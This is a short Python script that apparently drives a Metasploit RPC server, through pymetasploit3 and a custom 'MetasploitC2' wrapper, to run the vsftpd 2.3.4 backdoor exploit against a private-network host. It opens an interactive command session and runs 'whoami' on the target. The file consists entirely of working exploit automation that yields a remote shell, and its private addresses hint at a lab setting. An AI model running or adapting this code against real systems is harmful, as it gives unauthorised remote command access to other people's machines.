from pymetasploit3.msfrpc import *
from Operations.MetasploitShell import *

def main():
    client = MsfRpcClient('test', port=55552, server="192.168.254.95")
    print(client.modules.evasion)
    print(client.modules.search("vsftpd"))
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    print(exploit.options)
    print(exploit.missing_required)
    exploit['RHOSTS'] = '192.168.13.28'
    output = exploit.execute(payload='cmd/unix/interact')
    print(output)
    print(client.sessions.list)
    shell = client.sessions.session('1')
    shell.write('whoami')
    print(shell.read())

def main2():
    server = MetasploitC2("192.168.254.95", "test")
    client = MetasploitShell(1, server)
    exploit = server.metasploitServer.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = '192.168.13.28'
    output = exploit.execute(payload='cmd/unix/interact')
    print(output)
    print(client.executeShell("whoami"))

main2()